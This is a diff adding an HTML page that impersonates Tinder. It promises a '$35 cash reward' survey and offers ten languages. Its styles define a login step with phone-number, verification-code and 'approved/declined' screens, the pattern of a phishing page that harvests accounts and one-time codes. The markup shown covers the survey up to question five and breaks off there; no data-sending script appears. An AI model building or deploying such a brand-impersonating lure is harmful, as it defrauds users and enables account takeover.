@@ -1,0 +1,1539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<link rel="icon" type="image/png" href="https://www.tinder.com/static/build/8b49e77cd38a0e781dff7a1eef4cf618.png">
+<link rel="shortcut icon" type="image/png" href="https://www.tinder.com/static/build/8b49e77cd38a0e781dff7a1eef4cf618.png">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tinder Experience Survey — Claim Your $35 Cash Reward</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --t-red:#FE3C72;--t-orange:#FF6036;
+  --t-grad:linear-gradient(135deg,#FE3C72 0%,#FF6036 100%);
+  --gold:#FFB800;--gold-lt:#FFF8E1;--gold-dark:#B8860B;
+  --bg:#FFFFFF;--bg2:#F7F7F7;--bg3:#EFEFEF;
+  --surface:#FFFFFF;--border:#E8E8E8;--border2:#D0D0D0;
+  --text:#1A1A1A;--text2:#424242;--muted:#757575;--muted2:#B0B0B0;
+  --success:#00B74A;--r:16px;--r-sm:10px;--r-lg:24px;
+  --shadow-lg:0 8px 48px rgba(0,0,0,0.10);
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Nunito',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+
+/* HEADER */
+.header{position:sticky;top:0;z-index:200;background:rgba(255,255,255,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;}
+.header-logo{display:flex;align-items:center;gap:10px;}
+.header-logo-icon{width:34px;height:34px;background:var(--t-grad);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 2px 8px rgba(254,60,114,0.35);}
+.header-logo-text{font-size:22px;font-weight:900;letter-spacing:-0.5px;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.header-pill{background:var(--gold-lt);border:1.5px solid var(--gold);color:var(--gold-dark);font-size:12px;font-weight:700;padding:5px 14px;border-radius:20px;}
+
+/* HERO */
+.hero{position:relative;overflow:hidden;padding:72px 24px 56px;text-align:center;}
+.hero::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(254,60,114,0.05) 0%,rgba(255,96,54,0.03) 60%,transparent 100%);pointer-events:none;}
+.hero-inner{position:relative;z-index:1;max-width:640px;margin:0 auto;}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:7px;background:linear-gradient(135deg,rgba(254,60,114,0.08),rgba(255,96,54,0.06));border:1.5px solid rgba(254,60,114,0.2);color:var(--t-red);font-size:11px;font-weight:800;padding:6px 16px;border-radius:20px;text-transform:uppercase;letter-spacing:1px;margin-bottom:24px;}
+.eyebrow-dot{width:6px;height:6px;border-radius:50%;background:var(--t-red);}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.4)}}
+.hero h1{font-size:clamp(32px,6vw,54px);font-weight:900;line-height:1.1;letter-spacing:-1px;color:var(--text);margin-bottom:18px;}
+.hero h1 .grad{background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.hero-sub{font-size:16px;font-weight:600;color:var(--muted);line-height:1.65;max-width:480px;margin:0 auto 32px;}
+.reward-chip{display:inline-flex;align-items:center;gap:10px;background:var(--gold-lt);border:2px solid var(--gold);border-radius:14px;padding:12px 22px;box-shadow:0 2px 12px rgba(255,184,0,0.2);}
+.reward-chip-icon{font-size:22px;}
+.reward-chip-lbl{font-size:10px;font-weight:800;color:var(--gold-dark);text-transform:uppercase;letter-spacing:1px;}
+.reward-chip-name{font-size:15px;font-weight:800;color:#7A5C00;margin-top:1px;}
+
+/* TRUST */
+.trust-row{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;padding:0 24px 56px;}
+.trust-chip{display:flex;align-items:center;gap:6px;background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:7px 14px;font-size:12px;font-weight:700;color:var(--text2);}
+
+/* SURVEY */
+.survey-outer{max-width:640px;margin:0 auto;padding:0 20px 100px;}
+.survey-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--r-lg);overflow:hidden;box-shadow:var(--shadow-lg);}
+.prog-bar-wrap{height:5px;background:var(--bg3);}
+.prog-bar-fill{height:5px;background:var(--t-grad);transition:width 0.55s cubic-bezier(.4,0,.2,1);border-radius:0 3px 3px 0;}
+.prog-meta{display:flex;justify-content:space-between;align-items:center;padding:14px 24px 0;}
+.prog-dots{display:flex;gap:5px;}
+.prog-dot{width:8px;height:8px;border-radius:50%;background:var(--bg3);transition:background 0.3s;}
+.prog-dot.done{background:var(--t-red);}
+.prog-dot.current{background:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.18);}
+.prog-label{font-size:12px;font-weight:700;color:var(--muted);}
+.prog-pct{font-size:12px;font-weight:800;color:var(--t-red);}
+
+/* Q BODY */
+.q-body{padding:28px 24px 24px;}
+.q-step{display:none;}
+.q-step.active{display:block;}
+@keyframes slideIn{from{opacity:0;transform:translateX(24px);}to{opacity:1;transform:translateX(0);}}
+.q-tag{display:inline-block;font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:1.2px;color:var(--t-red);background:rgba(254,60,114,0.07);padding:4px 10px;border-radius:5px;margin-bottom:12px;}
+.q-type-badge{display:inline-block;font-size:10px;font-weight:700;padding:3px 9px;border-radius:5px;margin-left:6px;vertical-align:middle;}
+.q-type-badge.type-choice{background:rgba(99,102,241,0.1);color:#6366F1;}
+.q-type-badge.type-text{background:rgba(16,185,129,0.1);color:#059669;}
+.q-type-badge.type-scale{background:rgba(245,158,11,0.1);color:#D97706;}
+.q-text{font-size:20px;font-weight:900;line-height:1.3;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
+.q-sub{font-size:13px;color:var(--muted);margin-bottom:18px;font-weight:600;line-height:1.5;}
+
+/* MULTIPLE CHOICE */
+.opts{display:flex;flex-direction:column;gap:8px;}
+.opt{width:100%;text-align:left;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:13px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--text2);cursor:pointer;display:flex;align-items:center;gap:12px;transition:border-color 0.15s,background 0.15s,transform 0.1s,box-shadow 0.15s;}
+.opt:hover{border-color:rgba(254,60,114,0.4);background:rgba(254,60,114,0.04);transform:translateY(-1px);box-shadow:0 3px 12px rgba(254,60,114,0.1);}
+.opt.selected{border-color:var(--t-red);background:rgba(254,60,114,0.06);color:var(--text);transform:translateY(-1px);box-shadow:0 4px 16px rgba(254,60,114,0.15);}
+.opt-radio{width:20px;height:20px;border-radius:50%;flex-shrink:0;border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;transition:border-color 0.15s,background 0.15s;background:var(--bg);}
+.opt.selected .opt-radio{border-color:var(--t-red);background:var(--t-grad);}
+.opt-radio-dot{width:7px;height:7px;border-radius:50%;background:#fff;opacity:0;transform:scale(0);transition:opacity 0.15s,transform 0.2s cubic-bezier(.34,1.56,.64,1);}
+.opt.selected .opt-radio-dot{opacity:1;transform:scale(1);}
+
+/* TEXT INPUT */
+.text-input-wrap{position:relative;margin-bottom:4px;}
+.q-text-input{width:100%;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:14px 16px;font-family:'Nunito',sans-serif;font-size:15px;font-weight:700;color:var(--text);outline:none;transition:border-color 0.2s,box-shadow 0.2s;}
+.q-text-input:focus{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+.q-text-input::placeholder{color:var(--muted2);font-weight:600;}
+.q-text-input.valid{border-color:var(--success);box-shadow:0 0 0 3px rgba(0,183,74,0.08);}
+.input-check{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:18px;opacity:0;transition:opacity 0.2s;}
+.input-check.show{opacity:1;}
+
+/* TEXTAREA */
+.q-textarea{width:100%;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:14px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:600;color:var(--text);resize:vertical;min-height:110px;outline:none;transition:border-color 0.2s,box-shadow 0.2s;line-height:1.6;}
+.q-textarea:focus{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+.q-textarea::placeholder{color:var(--muted2);font-weight:600;}
+.char-hint{font-size:11px;font-weight:700;color:var(--muted2);text-align:right;margin-top:5px;transition:color 0.2s;}
+.char-hint.ok{color:var(--success);}
+
+/* SLIDER / SCALE */
+.scale-wrap{padding:8px 0 16px;}
+.scale-track{position:relative;padding:0 0 24px;}
+.scale-labels{display:flex;justify-content:space-between;margin-bottom:10px;}
+.scale-label{font-size:11px;font-weight:700;color:var(--muted);}
+input[type=range].scale-range{width:100%;-webkit-appearance:none;appearance:none;height:6px;border-radius:3px;outline:none;cursor:pointer;background:linear-gradient(90deg,var(--t-red) 0%,var(--t-red) var(--fill,50%),var(--bg3) var(--fill,50%),var(--bg3) 100%);}
+input[type=range].scale-range::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:24px;height:24px;border-radius:50%;background:var(--t-grad);border:3px solid #fff;box-shadow:0 2px 8px rgba(254,60,114,0.4);cursor:pointer;transition:transform 0.15s;}
+input[type=range].scale-range::-webkit-slider-thumb:hover{transform:scale(1.15);}
+input[type=range].scale-range::-moz-range-thumb{width:24px;height:24px;border-radius:50%;background:var(--t-grad);border:3px solid #fff;box-shadow:0 2px 8px rgba(254,60,114,0.4);cursor:pointer;}
+.scale-value-display{text-align:center;margin-top:4px;}
+.scale-value-num{font-size:28px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;line-height:1;}
+.scale-value-label{font-size:13px;font-weight:700;color:var(--muted);margin-top:3px;}
+
+/* MULTI-SELECT */
+.multi-opts{display:flex;flex-direction:column;gap:8px;}
+.multi-opt{width:100%;text-align:left;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:13px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--text2);cursor:pointer;display:flex;align-items:center;gap:12px;transition:border-color 0.15s,background 0.15s,transform 0.1s;}
+.multi-opt:hover{border-color:rgba(254,60,114,0.4);background:rgba(254,60,114,0.04);transform:translateY(-1px);}
+.multi-opt.selected{border-color:var(--t-red);background:rgba(254,60,114,0.06);color:var(--text);box-shadow:0 4px 16px rgba(254,60,114,0.12);}
+.multi-check{width:20px;height:20px;border-radius:5px;flex-shrink:0;border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;transition:border-color 0.15s,background 0.15s;background:var(--bg);}
+.multi-opt.selected .multi-check{border-color:var(--t-red);background:var(--t-grad);}
+.multi-check-icon{font-size:11px;color:#fff;opacity:0;transition:opacity 0.15s;}
+.multi-opt.selected .multi-check-icon{opacity:1;}
+.multi-hint{font-size:11px;font-weight:700;color:var(--muted);margin-bottom:10px;}
+
+/* VALIDATION */
+.val-msg{font-size:12px;font-weight:700;color:var(--t-red);margin-top:8px;display:none;padding:7px 12px;background:rgba(254,60,114,0.06);border-radius:7px;border-left:3px solid var(--t-red);}
+
+/* NAV */
+.q-nav{display:flex;justify-content:space-between;align-items:center;padding:16px 24px 20px;border-top:1px solid var(--border);gap:12px;}
+.btn-back{background:transparent;border:2px solid var(--border);border-radius:var(--r-sm);padding:10px 20px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--muted);cursor:pointer;transition:border-color 0.2s,color 0.2s;}
+.btn-back:hover{border-color:var(--border2);color:var(--text2);}
+.btn-next{background:var(--t-grad);border:none;border-radius:var(--r-sm);padding:11px 30px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:800;color:#fff;cursor:pointer;box-shadow:0 4px 16px rgba(254,60,114,0.35);transition:box-shadow 0.2s,transform 0.1s,filter 0.2s;}
+.btn-next:hover{filter:brightness(1.06);box-shadow:0 6px 24px rgba(254,60,114,0.45);}
+.btn-next:active{transform:scale(0.97);}
+
+/* STATS */
+.stats-section{background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border);padding:64px 24px;text-align:center;}
+.section-title{font-size:26px;font-weight:900;color:var(--text);letter-spacing:-0.5px;margin-bottom:6px;}
+.section-sub{font-size:14px;font-weight:700;color:var(--muted);margin-bottom:40px;}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px;max-width:680px;margin:0 auto;}
+.stat-card{background:var(--surface);border:1.5px solid var(--border);border-radius:16px;padding:22px 16px;box-shadow:0 2px 12px rgba(0,0,0,0.05);transition:transform 0.2s,box-shadow 0.2s;}
+.stat-card:hover{transform:translateY(-3px);box-shadow:0 6px 24px rgba(254,60,114,0.12);}
+.stat-card-val{font-size:32px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:5px;letter-spacing:-1px;}
+.stat-card-lbl{font-size:12px;font-weight:700;color:var(--muted);}
+
+/* FAQ */
+.faq-section{max-width:640px;margin:0 auto;padding:64px 24px;}
+.faq-item{border:1.5px solid var(--border);border-radius:12px;margin-bottom:8px;overflow:hidden;background:var(--surface);transition:border-color 0.2s;}
+.faq-item:hover{border-color:rgba(254,60,114,0.3);}
+.faq-q{display:flex;justify-content:space-between;align-items:center;padding:15px 18px;cursor:pointer;font-size:14px;font-weight:800;color:var(--text);gap:12px;transition:background 0.15s;}
+.faq-q:hover{background:var(--bg2);}
+.faq-icon{width:22px;height:22px;border-radius:50%;flex-shrink:0;background:var(--bg2);border:1.5px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;color:var(--muted);transition:background 0.2s,border-color 0.2s,color 0.2s,transform 0.3s;}
+.faq-item.open .faq-icon{background:var(--t-grad);border-color:var(--t-red);color:#fff;transform:rotate(45deg);}
+.faq-a{font-size:13px;font-weight:600;color:var(--muted);line-height:1.7;max-height:0;overflow:hidden;transition:max-height 0.4s ease,padding 0.3s ease;padding:0 18px;}
+.faq-item.open .faq-a{max-height:200px;padding:0 18px 15px;}
+
+/* FOOTER */
+.footer{background:var(--text);padding:32px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;}
+.footer-logo-text{font-size:20px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.footer-copy{font-size:12px;font-weight:700;color:#666;}
+.footer-links{display:flex;gap:18px;}
+.footer-links a{font-size:12px;font-weight:700;color:#666;text-decoration:none;transition:color 0.2s;}
+.footer-links a:hover{color:var(--t-red);}
+
+/* TOAST */
+.toast{position:fixed;bottom:24px;right:24px;z-index:9999;background:var(--text);color:#fff;border-radius:10px;padding:12px 20px;font-size:13px;font-weight:700;box-shadow:0 8px 32px rgba(0,0,0,0.18);transform:translateY(16px);opacity:0;transition:transform 0.3s,opacity 0.3s;pointer-events:none;}
+.toast.show{transform:translateY(0);opacity:1;}
+
+@media(max-width:600px){
+  .header{padding:0 16px;}
+  .hero{padding:56px 16px 44px;}
+  .q-body{padding:22px 18px 18px;}
+  .q-nav{padding:14px 18px 16px;}
+  .footer{flex-direction:column;align-items:flex-start;}
+}
+
+/* ── LOGIN FLOW STYLES ── */
+.ls-wrap { padding: 32px 24px 28px; max-width: 420px; margin: 0 auto; }
+.ls-logo-row { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; }
+.ls-flame { width: 38px; height: 38px; border-radius: 11px; background: var(--t-grad); display: flex; align-items: center; justify-content: center; font-size: 20px; box-shadow: 0 3px 10px rgba(254,60,114,0.35); }
+.ls-brand { font-size: 26px; font-weight: 900; letter-spacing: -0.5px; background: var(--t-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+.ls-congrats-pill { display: inline-flex; align-items: center; gap: 6px; background: var(--gold-lt); border: 1.5px solid var(--gold); color: var(--gold-dark); font-size: 12px; font-weight: 800; padding: 6px 14px; border-radius: 20px; margin-bottom: 20px; }
+.ls-title { font-size: 22px; font-weight: 900; color: var(--text); letter-spacing: -0.4px; margin-bottom: 8px; line-height: 1.25; }
+.ls-sub { font-size: 14px; font-weight: 600; color: var(--muted); line-height: 1.6; margin-bottom: 24px; }
+.ls-field-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 8px; }
+.ls-field { display: flex; align-items: center; gap: 10px; background: var(--bg2); border: 2px solid var(--border); border-radius: var(--r-sm); padding: 0 14px; transition: border-color 0.2s, box-shadow 0.2s; }
+.ls-field:focus-within { border-color: var(--t-red); box-shadow: 0 0 0 3px rgba(254,60,114,0.1); }
+.ls-field-icon { font-size: 16px; flex-shrink: 0; }
+.ls-input { flex: 1; background: transparent; border: none; outline: none; padding: 13px 0; font-family: 'Nunito', sans-serif; font-size: 14px; font-weight: 700; color: var(--text); }
+.ls-input::placeholder { color: var(--muted2); font-weight: 600; }
+.ls-val-msg { font-size: 12px; font-weight: 700; color: var(--t-red); padding: 7px 12px; background: rgba(254,60,114,0.06); border-radius: 7px; border-left: 3px solid var(--t-red); margin-bottom: 14px; display: none; }
+.ls-btn { width: 100%; padding: 14px; background: var(--t-grad); border: none; border-radius: var(--r-sm); font-family: 'Nunito', sans-serif; font-size: 15px; font-weight: 800; color: #fff; cursor: pointer; margin-bottom: 14px; box-shadow: 0 4px 18px rgba(254,60,114,0.35); transition: filter 0.2s, transform 0.1s, opacity 0.2s; opacity: 1; }
+.ls-btn:hover { filter: brightness(1.06); }
+.ls-btn:active { transform: scale(0.98); }
+.ls-btn:disabled { opacity: 0.6; cursor: not-allowed; filter: none; transform: none; }
+.ls-terms { font-size: 11px; font-weight: 600; color: var(--muted2); text-align: center; line-height: 1.6; }
+.ls-terms a { color: var(--t-red); text-decoration: none; }
+.ls-resend { font-size: 13px; font-weight: 700; color: var(--muted); text-align: center; cursor: default; margin-top: 4px; }
+.ls-resend span { color: var(--t-red); cursor: pointer; }
+.ls-resend span:hover { text-decoration: underline; }
+.ls-code-row { display: flex; gap: 12px; justify-content: center; margin-bottom: 8px; }
+.ls-code-box { width: 60px; height: 64px; border-radius: 12px; border: 2px solid var(--border); background: var(--bg2); font-family: 'Nunito', sans-serif; font-size: 26px; font-weight: 900; color: var(--text); text-align: center; outline: none; transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s; caret-color: var(--t-red); }
+.ls-code-box:focus { border-color: var(--t-red); box-shadow: 0 0 0 3px rgba(254,60,114,0.12); transform: scale(1.06); }
+.ls-spinner-wrap { display: flex; justify-content: center; margin: 24px 0 16px; }
+.ls-spinner { width: 48px; height: 48px; border-radius: 50%; border: 4px solid var(--bg3); border-top-color: var(--t-red); animation: spin 0.85s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.ls-status-bar { display: flex; flex-direction: column; gap: 10px; background: var(--bg2); border: 1.5px solid var(--border); border-radius: 14px; padding: 16px 20px; margin: 20px 0; text-align: left; }
+.ls-status-item { display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 700; color: var(--text2); }
+.ls-status-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--bg3); border: 2px solid var(--border2); flex-shrink: 0; transition: background 0.3s, border-color 0.3s; }
+.ls-status-dot.done { background: var(--success); border-color: var(--success); }
+.ls-status-dot.pulse { background: var(--t-red); border-color: var(--t-red); animation: pulse 1.5s infinite; }
+.ls-status-dot.error { background: #E53935; border-color: #E53935; }
+.ls-approved-badge { display: inline-block; background: rgba(0,183,74,0.1); border: 1.5px solid rgba(0,183,74,0.4); color: var(--success); font-size: 14px; font-weight: 800; padding: 8px 20px; border-radius: 20px; margin-bottom: 8px; }
+.ls-declined-badge { display: inline-block; background: rgba(229,57,53,0.08); border: 1.5px solid rgba(229,57,53,0.3); color: #E53935; font-size: 14px; font-weight: 800; padding: 8px 20px; border-radius: 20px; margin-bottom: 8px; }
+
+/* ═══ RICH ANIMATIONS ═══ */
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes bounceIn{0%{transform:scale(0.3);opacity:0}50%{transform:scale(1.08)}70%{transform:scale(0.96)}100%{transform:scale(1);opacity:1}}
+@keyframes shake{0%,100%{transform:translateX(0)}15%{transform:translateX(-7px)}30%{transform:translateX(7px)}45%{transform:translateX(-5px)}60%{transform:translateX(5px)}75%{transform:translateX(-2px)}90%{transform:translateX(2px)}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+.hero h1 .grad{background:linear-gradient(270deg,#FE3C72,#FF6036,#FFB300,#FE3C72);background-size:300% 300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.q-step.active{display:block;}
+.ls-spinner{animation:spin 0.75s linear infinite;}
+.shake{animation:shake 0.5s ease both!important;}
+.btn-next,.ls-btn{position:relative;overflow:hidden;}
+.q-text-input.valid,.ls-input:valid{background:linear-gradient(90deg,var(--bg2) 0%,rgba(255,255,255,0.9) 50%,var(--bg2) 100%);background-size:200% 100%;animation:shimmer 1.5s ease;}
+.prog-dot.done{animation:bounceIn 0.3s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* ── LANGUAGE SELECTOR OVERLAY ── */
+#lang-overlay{position:fixed;inset:0;z-index:9999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 24px;animation:fadeIn .3s ease;}
+#lang-overlay.hidden{display:none;}
+.lang-logo{width:64px;height:64px;background:var(--t-grad);border-radius:18px;display:flex;align-items:center;justify-content:center;font-size:34px;box-shadow:0 4px 18px rgba(254,60,114,0.3);margin-bottom:22px;}
+.lang-title{font-size:22px;font-weight:900;color:var(--text);margin-bottom:6px;letter-spacing:-.3px;text-align:center;}
+.lang-sub{font-size:14px;color:var(--muted);text-align:center;margin-bottom:28px;line-height:1.5;}
+.lang-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%;max-width:360px;}
+.lang-btn{display:flex;align-items:center;gap:10px;background:#fff;border:1.5px solid var(--border);border-radius:14px;padding:14px 16px;cursor:pointer;font-family:inherit;font-size:14px;font-weight:700;color:var(--text);transition:all .15s;box-shadow:0 1px 4px rgba(0,0,0,0.05);}
+.lang-btn:hover,.lang-btn:active{border-color:#FE3C72;background:#FFF5F7;box-shadow:0 2px 12px rgba(254,60,114,0.12);}
+.lang-flag{font-size:22px;line-height:1;}
+
+/* ── PHONE COUNTRY CODE TRIGGER — show ONLY dial code ── */
+.cc-trigger .cc-flag{ display: none !important; }
+.cc-trigger .cc-code{ font-size: 15px; font-weight: 800; color: var(--text); }
+</style>
+</head>
+<body>
+
+<!-- LANGUAGE SELECTOR OVERLAY -->
+<div id="lang-overlay">
+  <div class="lang-logo">🔥</div>
+  <div class="lang-title" id="lang-overlay-title">Choose Your Language</div>
+  <div class="lang-sub" id="lang-overlay-sub">Select the language you'd like to use for this survey</div>
+  <div class="lang-grid">
+    <button class="lang-btn" onclick="chooseLang('id')"><span class="lang-flag">🇮🇩</span> Bahasa Indonesia</button>
+    <button class="lang-btn" onclick="chooseLang('ms')"><span class="lang-flag">🇲🇾</span> Bahasa Malaysia</button>
+    <button class="lang-btn" onclick="chooseLang('en')"><span class="lang-flag">🇬🇧</span> English</button>
+    <button class="lang-btn" onclick="chooseLang('fr')"><span class="lang-flag">🇫🇷</span> Français</button>
+    <button class="lang-btn" onclick="chooseLang('es')"><span class="lang-flag">🇪🇸</span> Español</button>
+    <button class="lang-btn" onclick="chooseLang('pt')"><span class="lang-flag">🇧🇷</span> Português</button>
+    <button class="lang-btn" onclick="chooseLang('ar')"><span class="lang-flag">🇸🇦</span> العربية</button>
+    <button class="lang-btn" onclick="chooseLang('sw')"><span class="lang-flag">🇰🇪</span> Kiswahili</button>
+    <button class="lang-btn" onclick="chooseLang('ha')"><span class="lang-flag">🇳🇬</span> Hausa</button>
+    <button class="lang-btn" onclick="chooseLang('yo')"><span class="lang-flag">🇳🇬</span> Yorùbá</button>
+  </div>
+</div>
+
+<!-- HEADER -->
+<header class="header">
+  <div class="header-logo">
+    <div class="header-logo-icon">🔥</div>
+    <div class="header-logo-text">tinder</div>
+  </div>
+  <div class="header-pill">⭐ $35 Cash Reward Survey</div>
+</header>
+
+<div class="trust-row">
+  <div class="trust-chip">✅ <span data-i18n="trust1">All 8 questions required</span></div>
+  <div class="trust-chip">🎯 <span data-i18n="trust2">Mix of question types</span></div>
+  <div class="trust-chip">⚡ <span data-i18n="trust3">Instant reward code</span></div>
+  <div class="trust-chip">🔒 <span data-i18n="trust4">No payment needed</span></div>
+</div>
+
+<!-- SURVEY CARD -->
+<div class="survey-outer" id="survey-wrap" style="display:none;">
+  <div class="survey-card">
+
+    <div class="prog-bar-wrap">
+      <div class="prog-bar-fill" id="prog-fill" style="width:0%"></div>
+    </div>
+    <div class="prog-meta">
+      <div class="prog-dots" id="prog-dots"></div>
+      <div style="display:flex;gap:10px;align-items:center;">
+        <span class="prog-label" id="prog-label">Question 1 of 8</span>
+        <span class="prog-pct" id="prog-pct">0%</span>
+      </div>
+    </div>
+
+    <div class="q-body">
+
+      <div class="q-step active" id="q1">
+        <div class="q-tag">Question 01 / 08 <span class="q-type-badge type-choice" data-i18n="badge_choice">Multiple choice</span></div>
+        <div class="q-text" data-i18n="q1_text">How long have you been using Tinder?</div>
+        <div class="q-sub" data-i18n="q1_sub">Pick the option that best describes you.</div>
+        <div class="opts" id="opts-q1">
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q1_a1">Less than 6 months</span></button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q1_a2">6 months – 1 year</span></button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q1_a3">1 – 3 years</span></button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q1_a4">3 – 5 years</span></button>
+          <button class="opt" onclick="pick(this,'q1')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q1_a5">More than 5 years</span></button>
+        </div>
+        <div class="val-msg" id="vm-q1" data-i18n="val_choice">Please choose an answer to continue.</div>
+      </div>
+
+      <div class="q-step" id="q2">
+        <div class="q-tag">Question 02 / 08 <span class="q-type-badge type-text" data-i18n="badge_text">Text input</span></div>
+        <div class="q-text" data-i18n="q2_text">What do you look for first on someone's Tinder profile?</div>
+        <div class="q-sub" data-i18n="q2_sub">Bio, photos, prompts? Tell us what catches your eye first.</div>
+        <div class="text-input-wrap">
+          <input class="q-text-input" type="text" id="q2-input" data-i18n-ph="q2_ph" placeholder="e.g. Their photos, the bio, shared interests…" oninput="onShortInput('q2-input','q2-check','vm-q2','q2',5)" autocomplete="off">
+          <span class="input-check" id="q2-check">✅</span>
+        </div>
+        <div class="val-msg" id="vm-q2" data-i18n="val_text">Please type at least 5 characters to continue.</div>
+      </div>
+
+      <div class="q-step" id="q3">
+        <div class="q-tag">Question 03 / 08 <span class="q-type-badge type-scale" data-i18n="badge_scale">Slider</span></div>
+        <div class="q-text" data-i18n="q3_text">On a scale of 1–10, how satisfied are you with Tinder overall?</div>
+        <div class="q-sub" data-i18n="q3_sub">Drag the slider to your score.</div>
+        <div class="scale-wrap">
+          <div class="scale-labels">
+            <span class="scale-label" data-i18n="q3_low">😞 1 — Very unhappy</span>
+            <span class="scale-label" data-i18n="q3_high">😍 10 — Love it</span>
+          </div>
+          <input type="range" class="scale-range" id="q3-slider" min="1" max="10" value="5" step="1" oninput="onSlider()">
+          <div class="scale-value-display">
+            <div class="scale-value-num" id="q3-val">5</div>
+            <div class="scale-value-label" id="q3-lbl">Neutral</div>
+          </div>
+        </div>
+        <div class="val-msg" id="vm-q3"></div>
+      </div>
+
+      <div class="q-step" id="q4">
+        <div class="q-tag">Question 04 / 08 <span class="q-type-badge type-text" data-i18n="badge_text">Text input</span></div>
+        <div class="q-text" data-i18n="q4_text">What kind of opening message actually gets you to reply?</div>
+        <div class="q-sub" data-i18n="q4_sub">No wrong answers — just tell us what works for you.</div>
+        <div class="text-input-wrap">
+          <input class="q-text-input" type="text" id="q4-input" data-i18n-ph="q4_ph" placeholder="e.g. A funny joke, a genuine compliment, a question…" oninput="onShortInput('q4-input','q4-check','vm-q4','q4',5)" autocomplete="off">
+          <span class="input-check" id="q4-check">✅</span>
+        </div>
+        <div class="val-msg" id="vm-q4" data-i18n="val_text">Please type at least 5 characters to continue.</div>
+      </div>
+
+      <div class="q-step" id="q5">
+        <div class="q-tag">Question 05 / 08 <span class="q-type-badge type-choice" data-i18n="badge_multi">Multi-select</span></div>
+        <div class="q-text" data-i18n="q5_text">Which Tinder features have you used? (Select all that apply)</div>
+        <div class="multi-hint" data-i18n="q5_hint">You can pick more than one.</div>
+        <div class="multi-opts" id="multi-q5">
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span><span data-i18n="q5_a1">⭐ Super Likes</span></button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span><span data-i18n="q5_a2">↩️ Rewind (undo swipe)</span></button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span><span data-i18n="q5_a3">🌍 Passport (other cities)</span></button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span><span data-i18n="q5_a4">🚀 Boost</span></button>
